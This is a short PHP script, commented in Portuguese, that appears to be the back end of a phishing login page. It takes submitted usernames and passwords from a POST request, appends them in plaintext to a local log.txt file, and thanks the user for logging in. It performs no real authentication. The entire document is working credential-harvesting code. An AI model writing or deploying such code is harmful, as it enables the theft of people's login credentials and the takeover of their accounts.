<?php
// Arquivo de log para salvar as credenciais
$logfile = "log.txt";

// Verificando se os dados foram enviados
if(isset($_POST['username']) && isset($_POST['password'])){
    // Capturando as credenciais
    $username = $_POST['username'];
    $password = $_POST['password'];

    // Registrando as credenciais no arquivo de log
    $log = fopen($logfile, "a");
    fwrite($log, "Username: " . $username . "\n");
    fwrite($log, "Password: " . $password . "\n");
    fwrite($log, "-------------------------\n");
    fclose($log);

    // Exibindo uma mensagem de agradecimento
    echo "<h2>Thank you for logging in!</h2>";
    echo "<p>Your credentials have been saved.</p>";
} else {
    echo "<p>No data received.</p>";
}
?>
